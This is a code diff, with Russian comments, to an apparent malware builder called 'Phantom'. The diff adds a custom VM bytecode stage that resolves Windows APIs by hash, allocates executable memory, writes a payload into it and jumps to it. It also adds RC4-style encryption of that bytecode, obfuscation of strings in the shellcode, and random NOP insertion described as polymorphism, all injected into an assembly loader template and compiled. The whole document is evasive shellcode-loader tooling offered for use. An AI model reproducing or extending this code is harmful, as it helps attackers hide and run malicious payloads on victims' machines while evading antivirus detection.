@@ -99,25 +99,8 @@ void GenerateRandomKey(BYTE* key, int size) {
     }
 }
 
-// Шифрование полезной нагрузки
-BYTE* EncryptPayload(const BYTE* payload, SIZE_T size, const BYTE* key, int key_size) {
-    BYTE* encrypted = (BYTE*)malloc(size);
-    if (!encrypted) {
-        printf("[-] Ошибка: не удалось выделить память для шифрования\n");
-        return NULL;
-    }
-    
-    for (SIZE_T i = 0; i < size; i++) {
-        BYTE k = key[i % key_size];
-        BYTE offset = (BYTE)(i & 0xFF);
-        encrypted[i] = payload[i] ^ k ^ offset ^ 0xAA;
-    }
-    
-    return encrypted;
-}
-
 // Внедрение шелл-кода в шаблон загрузчика
-BYTE* BuildLoader(const char* template_file, const BYTE* encrypted, SIZE_T payload_size, 
+BYTE* BuildLoader(const char* template_file, const BYTE* encrypted_bytecode, SIZE_T bytecode_len, 
                   const BYTE* key, int key_size, SIZE_T* output_size) {
     // Загружаем шаблон загрузчика
     SIZE_T template_size = 0;
@@ -127,18 +110,18 @@ BYTE* BuildLoader(const char* template_file, const BYTE* encrypted, SIZE_T paylo
     }
     
     // Ищем маркеры для замены
-    const char* key_size_marker = "key_size:\n    dq 16";
+    const char* key_size_marker = "key_size:";
     const char* key_marker = "encryption_key:";
-    const char* payload_size_marker = "payload_size:\n    dq 512";
-    const char* encrypted_payload_marker = "encrypted_payload:";
+    const char* bytecode_size_marker = "bytecode_size:";
+    const char* bytecode_payload_marker = "bytecode_payload:";
     
     char* key_size_pos = strstr((char*)template_data, key_size_marker);
     char* key_pos = strstr((char*)template_data, key_marker);
-    char* payload_size_pos = strstr((char*)template_data, payload_size_marker);
-    char* encrypted_payload_pos = strstr((char*)template_data, encrypted_payload_marker);
+    char* bytecode_size_pos = strstr((char*)template_data, bytecode_size_marker);
+    char* bytecode_payload_pos = strstr((char*)template_data, bytecode_payload_marker);
     
-    if (!key_size_pos || !key_pos || !payload_size_pos || !encrypted_payload_pos) {
-        printf("[-] Ошибка: маркеры не найдены в шаблоне\n");
+    if (!key_size_pos || !key_pos || !bytecode_size_pos || !bytecode_payload_pos) {
+        printf("[-] Ошибка: маркеры не найдены в шаблоне (key_size, encryption_key, bytecode_size, bytecode_payload)\n");
         free(template_data);
         return NULL;
     }
@@ -159,23 +142,29 @@ BYTE* BuildLoader(const char* template_file, const BYTE* encrypted, SIZE_T paylo
         key_pos += sprintf(key_pos, "\n");
     }
     
-    // Обновляем размер полезной нагрузки
-    sprintf(payload_size_pos, "payload_size:\n    dq %zu", payload_size);
+    // Обновляем размер байткода
+    bytecode_size_pos = strchr(bytecode_size_pos, ':') + 1;
+    while(*bytecode_size_pos && isspace(*bytecode_size_pos)) bytecode_size_pos++;
+    sprintf(bytecode_size_pos, "\n    dq %zu", bytecode_len);
+
+    // Обновляем зашифрованный байткод
+    bytecode_payload_pos = strchr(bytecode_payload_pos, ':') + 1;
+    while(*bytecode_payload_pos && isspace(*bytecode_payload_pos)) bytecode_payload_pos++;
+    char* end_line = strchr(bytecode_payload_pos, '\n');
+    if (end_line) *end_line = '\0'; 
+    bytecode_payload_pos += sprintf(bytecode_payload_pos, "\n    db ");
     
-    // Обновляем зашифрованную полезную нагрузку
-    encrypted_payload_pos = strchr(encrypted_payload_pos, '\n') + 1;
-    encrypted_payload_pos += sprintf(encrypted_payload_pos, "    db ");
-    
-    for (SIZE_T i = 0; i < payload_size; i++) {
-        encrypted_payload_pos += sprintf(encrypted_payload_pos, "0x%02X", encrypted[i]);
-        if (i < payload_size - 1) {
-            if ((i + 1) % 8 == 0) {
-                encrypted_payload_pos += sprintf(encrypted_payload_pos, "\n    db ");
+    for (SIZE_T i = 0; i < bytecode_len; i++) {
+        bytecode_payload_pos += sprintf(bytecode_payload_pos, "0x%02X", encrypted_bytecode[i]);
+        if (i < bytecode_len - 1) {
+            if ((i + 1) % 16 == 0) {
+                bytecode_payload_pos += sprintf(bytecode_payload_pos, "\\\n    db ");
             } else {
-                encrypted_payload_pos += sprintf(encrypted_payload_pos, ", ");
+                bytecode_payload_pos += sprintf(bytecode_payload_pos, ",");
             }
         }
     }
+    bytecode_payload_pos += sprintf(bytecode_payload_pos, "\n");
     
     // Обновляем размер выходных данных
     *output_size = strlen((char*)template_data);
@@ -244,6 +233,119 @@ BOOL CompileLoader(const char* asm_file, const char* output_file) {
     return (result == 0);
 }
 
+// Опкоды нашей VM (пример)
+#define VM_PUSH_CONST_QWORD 0x01
+#define VM_LOAD_API_HASH    0x02
+#define VM_CALL_API         0x03 // Вызов API из VM_R0 (r14), аргументы со стека VM
+#define VM_POP_REG          0x04 // POP со стека VM в регистр VM (например, R0/r14)
+#define VM_PUSH_REG         0x05 // PUSH регистра VM на стек VM
+#define VM_JMP_REG          0x06 // JMP на адрес в регистре VM (например, R0/r14)
+#define VM_MOV_REG_CONST    0x07 // MOV VM_Rx, CONST64 (Пока только для R0/r14)
+#define VM_XOR_MEM          0x0A // XOR участка памяти (для возможной саморасшифровки)
+#define VM_HALT             0xFF
+
+// Хеши API (примеры, нужны реальные)
+#define HASH_KERNEL32          0x68CF2B3B // Примерный хеш для kernel32.dll (нужно вычислить!)
+#define HASH_NTDLL             0x3CFA685D // Примерный хеш для ntdll.dll (нужно вычислить!)
+#define HASH_VIRTUALALLOC      0xE5534117 // Пример для kernel32.VirtualAlloc (нужно вычислить!)
+#define HASH_WRITEPROCESSMEMORY 0x1E38AE13 // Пример для kernel32.WriteProcessMemory (нужно вычислить!)
+#define HASH_EXITPROCESS       0x56A2B5F0 // Пример для kernel32.ExitProcess (нужно вычислить!)
+
+// Вспомогательная функция для записи опкода и операндов
+static BYTE* emit_byte(BYTE* p, BYTE val) { *p++ = val; return p; }
+static BYTE* emit_dword(BYTE* p, uint32_t val) { *(uint32_t*)p = val; return p + 4; }
+static BYTE* emit_qword(BYTE* p, uint64_t val) { *(uint64_t*)p = val; return p + 8; }
+
+// Генерирует байткод для загрузки и запуска payload
+BYTE* CompileToBytecode(const BYTE* payload, SIZE_T payload_size, SIZE_T* bytecode_size) {
+    // Очень грубая оценка размера байткода + сам payload
+    SIZE_T max_size = payload_size + 512; // Увеличим запас под инструкции
+    BYTE* bytecode = (BYTE*)malloc(max_size);
+    if (!bytecode) return NULL;
+
+    BYTE* p = bytecode;
+
+    printf("[Builder] Generating bytecode...\n");
+
+    // --- Код байткода --- 
+
+    // 1. Выделить память для payload
+    p = emit_byte(p, VM_PUSH_CONST_QWORD);      // PUSH Protection (PAGE_EXECUTE_READWRITE = 0x40)
+    p = emit_qword(p, 0x40);
+    p = emit_byte(p, VM_PUSH_CONST_QWORD);      // PUSH AllocationType (MEM_COMMIT | MEM_RESERVE = 0x3000)
+    p = emit_qword(p, 0x3000);
+    p = emit_byte(p, VM_PUSH_CONST_QWORD);      // PUSH Size (payload_size)
+    p = emit_qword(p, payload_size);
+    p = emit_byte(p, VM_PUSH_CONST_QWORD);      // PUSH Address (NULL)
+    p = emit_qword(p, 0);
+    p = emit_byte(p, VM_PUSH_CONST_QWORD);      // PUSH ProcessHandle (-1 for current process)
+    p = emit_qword(p, (uint64_t)-1);
+    p = emit_byte(p, VM_LOAD_API_HASH);         // LOAD VirtualAlloc -> R0 (r14)
+    p = emit_dword(p, HASH_VIRTUALALLOC);
+    p = emit_byte(p, VM_CALL_API);              // CALL VirtualAlloc(hProc, Addr, Size, Type, Prot)
+    p = emit_byte(p, 0);                        // Адрес API в R0
+    p = emit_byte(p, 5);                        // 5 аргументов
+    // Результат (адрес выделенной памяти) теперь в R0 (r14)
+
+    // 2. Скопировать payload в выделенную память
+    p = emit_byte(p, VM_PUSH_CONST_QWORD);      // PUSH Size (payload_size)
+    p = emit_qword(p, payload_size);
+    p = emit_byte(p, VM_PUSH_CONST_QWORD);      // PUSH Source Address (payload - будет в конце байткода)
+    // Адрес payload будет вычислен позже, пока ставим 0
+    uint64_t* payload_addr_ref = (uint64_t*)p;
+    p = emit_qword(p, 0); 
+    p = emit_byte(p, VM_PUSH_REG);              // PUSH Destination Address (из R0)
+    p = emit_byte(p, 0);                        // Регистр R0
+    p = emit_byte(p, VM_PUSH_CONST_QWORD);      // PUSH ProcessHandle (-1)
+    p = emit_qword(p, (uint64_t)-1);
+    // Сохраняем адрес выделенной памяти (R0) в другой регистр (R1/r13), т.к. LOAD_API затрет R0
+    // p = emit_byte(p, VM_MOV_REG_REG);           // MOV R1, R0  -- ПОКА НЕТ MOV_REG_REG
+    // p = emit_byte(p, 1);                        // Целевой регистр R1 (r13)
+    // p = emit_byte(p, 0);                        // Исходный регистр R0 (r14)
+    // Вместо MOV_REG_REG используем POP_REG
+    p = emit_byte(p, VM_POP_REG);               // POP Destination Address -> R1 (r13)
+    p = emit_byte(p, 1);                        // Регистр R1
+
+    p = emit_byte(p, VM_LOAD_API_HASH);         // LOAD WriteProcessMemory -> R0 (r14)
+    p = emit_dword(p, HASH_WRITEPROCESSMEMORY);
+    p = emit_byte(p, VM_CALL_API);              // CALL WriteProcessMemory(hProc, BaseAddr, Buffer, Size)
+    p = emit_byte(p, 0);                        // Адрес API в R0
+    p = emit_byte(p, 4);                        // 4 аргумента
+    // R1 (r13) все еще хранит адрес payload в удаленном процессе
+    
+    // 3. Передать управление payload
+    p = emit_byte(p, VM_JMP_REG);               // JMP на адрес в регистре R1
+    p = emit_byte(p, 1);                        // Регистр R1 (r13)
+
+    // 4. Halt (на всякий случай, если JMP не сработает)
+    p = emit_byte(p, VM_HALT);                  // HALT
+
+    // --- Конец кода байткода ---
+    
+    // Вычисляем реальный размер сгенерированного байткода
+    SIZE_T generated_bytecode_size = p - bytecode;
+    
+    // Вычисляем адрес, где будет начинаться payload (сразу после байткода)
+    // Адрес относительный от начала всего блока bytecode_payload в stage0.asm
+    uint64_t payload_runtime_offset = (uint64_t)generated_bytecode_size; 
+    *payload_addr_ref = payload_runtime_offset; // Вставляем смещение payload в инструкцию PUSH
+
+    // Копируем сам payload в конец буфера
+    if ((p - bytecode) + payload_size > max_size) {
+        printf("[Builder] Error: Max bytecode size exceeded!\n");
+        free(bytecode);
+        return NULL;
+    }
+    memcpy(p, payload, payload_size);
+
+    // Устанавливаем финальный размер (байткод + payload)
+    *bytecode_size = generated_bytecode_size + payload_size;
+
+    printf("[Builder] Bytecode generated successfully (size: %zu instructions, %zu payload, %zu total)\n", 
+            generated_bytecode_size, payload_size, *bytecode_size);
+    return bytecode; 
+}
+
 // Основная функция билдера
 BOOL BuildPhantomPayload(const BuilderConfig* config) {
     printf("[*] Начинаем сборку...\n");
@@ -257,9 +359,20 @@ BOOL BuildPhantomPayload(const BuilderConfig* config) {
     
     printf("[+] Полезная нагрузка загружена, размер: %zu байт\n", payload_size);
     
-    // Шифруем полезную нагрузку
-    BYTE* encrypted = EncryptPayload(payload, payload_size, config->key, config->key_size);
-    if (!encrypted) {
+    // Генерируем байткод из payload (пока заглушка - копирует payload)
+    SIZE_T bytecode_size = 0;
+    BYTE* bytecode = CompileToBytecode(payload, payload_size, &bytecode_size);
+    if (!bytecode) {
+        free(payload);
+        return FALSE; // Ошибка генерации байткода
+    }
+    printf("[+] Байткод сгенерирован (заглушка), размер: %zu байт\n", bytecode_size);
+
+    // Шифруем байткод с помощью RC4
+    SIZE_T encrypted_size = 0; 
+    BYTE* encrypted_bytecode = AdvancedEncryptPayload(bytecode, bytecode_size, config->key, config->key_size, 3, &encrypted_size);
+    if (!encrypted_bytecode) { // Проверяем правильную переменную
+        free(bytecode);
         free(payload);
         return FALSE;
     }
@@ -273,18 +386,20 @@ BOOL BuildPhantomPayload(const BuilderConfig* config) {
     sprintf(temp_bin, "temp_loader.bin");
     
     // Замена маркеров в шаблоне загрузчика
-    SIZE_T loader_size = 0;
-    BYTE* loader = BuildLoader(config->template_file, encrypted, payload_size, config->key, config->key_size, &loader_size);
-    if (!loader) {
-        free(encrypted);
+    SIZE_T loader_asm_size = 0;
+    BYTE* loader_asm = BuildLoader(config->template_file, encrypted_bytecode, bytecode_size, config->key, config->key_size, &loader_asm_size);
+    if (!loader_asm) {
+        free(encrypted_bytecode);
+        free(bytecode);
         free(payload);
         return FALSE;
     }
     
     // Записываем ASM файл
-    if (!WriteFile(temp_asm, loader, loader_size)) {
-        free(loader);
-        free(encrypted);
+    if (!WriteFile(temp_asm, loader_asm, loader_asm_size)) {
+        free(loader_asm);
+        free(encrypted_bytecode);
+        free(bytecode);
         free(payload);
         return FALSE;
     }
@@ -294,22 +409,30 @@ BOOL BuildPhantomPayload(const BuilderConfig* config) {
     // Компилируем загрузчик
     if (!CompileLoader(temp_asm, temp_bin)) {
         printf("[-] Ошибка компиляции загрузчика\n");
-        free(loader);
-        free(encrypted);
+        free(loader_asm);
+        free(encrypted_bytecode);
+        free(bytecode);
         free(payload);
         return FALSE;
     }
     
-    printf("[+] Загрузчик успешно скомпилирован: %s\n", temp_bin);
+    printf("[+] Скомпилированный загрузчик загружен, размер: %zu байт\n", loader_asm_size);
     
     // Загружаем скомпилированный бинарный файл
     SIZE_T shellcode_size = 0;
     BYTE* shellcode = LoadFile(temp_bin, &shellcode_size);
     if (!shellcode) {
-        free(loader);
-        free(encrypted);
+        free(encrypted_bytecode);
+        free(loader_asm);
+        free(bytecode);
         free(payload);
         return FALSE;
+    }
+    
+    // Обфускация строк в скомпилированном шеллкоде (если уровень > 1)
+    if (config->obfuscation_level > 1) {
+        printf("[*] Выполняем обфускацию строк...\n");
+        ObfuscateStringsInBinary(shellcode, shellcode_size);
     }
     
     // Если нужно создать polyglot файл
@@ -324,8 +447,8 @@ BOOL BuildPhantomPayload(const BuilderConfig* config) {
     
     // Очистка
     free(shellcode);
-    free(loader);
-    free(encrypted);
+    free(loader_asm);
+    free(encrypted_bytecode);
     free(payload);
     
     // Удаляем временные файлы
@@ -419,6 +542,8 @@ void InitializeObfuscation(BuilderConfig* config) {
 
 // Функция для сборки полиморфного шелл-кода разных уровней
 BYTE* BuildPolymorphicShellcode(const BYTE* original, SIZE_T size, int level, SIZE_T* out_size) {
+    srand((unsigned int)time(NULL)); // Инициализация ГПСЧ
+
     // На уровне 1 просто копируем оригинальный шелл-код
     if (level <= 1) {
         BYTE* result = (BYTE*)malloc(size);
@@ -429,19 +554,32 @@ BYTE* BuildPolymorphicShellcode(const BYTE* original, SIZE_T size, int level, SI
         return result;
     }
     
-    // На уровнях 2 и 3 добавляем обфускацию
-    SIZE_T new_size = size + (size / 2); // Резервируем место для добавления ложного кода
-    BYTE* result = (BYTE*)malloc(new_size);
+    // На уровнях 2 и 3 добавляем обфускацию (вставка NOP)
+    // Оценочный максимальный размер: оригинал + до 3 NOP на каждый байт + запас
+    SIZE_T max_new_size = size * 4 + 16; 
+    BYTE* result = (BYTE*)malloc(max_new_size);
     if (!result) return NULL;
     
-    // TODO: Реализовать полиморфные трансформации
-    // - Замена последовательностей инструкций эквивалентными
-    // - Добавление мусорного кода
-    // - Перестановка независимых блоков
+    SIZE_T current_pos = 0;
+    for (SIZE_T i = 0; i < size; i++) {
+        // Копируем оригинальный байт
+        if (current_pos < max_new_size) {
+            result[current_pos++] = original[i];
+        }
+        
+        // Вставляем случайное количество NOP (0, 1, 2 или 3)
+        // Для уровня 3 делаем вероятность NOP выше
+        int max_nops = (level >= 3) ? 3 : 2;
+        int num_nops = rand() % (max_nops + 1);
+        
+        for (int j = 0; j < num_nops; j++) {
+            if (current_pos < max_new_size) {
+                result[current_pos++] = 0x90; // NOP
+            }
+        }
+    }
     
-    // Пока просто копируем оригинальный код
-    memcpy(result, original, size);
-    *out_size = size;
+    *out_size = current_pos;
     
     return result;
 }
